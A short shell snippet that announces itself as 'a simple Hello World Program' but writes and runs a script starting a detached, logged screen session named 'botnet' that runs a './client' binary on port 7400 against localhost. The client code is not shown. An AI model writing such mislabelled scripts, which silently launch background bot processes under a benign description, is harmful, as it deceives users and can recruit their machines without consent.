echo "This is a simple Hello World Program"
cat > script.sh <<EOF
#!/bin/bash
screen -dmSL botnet ./client -p 7400 localhost &
EOF
chmod +x script.sh
sh script.sh
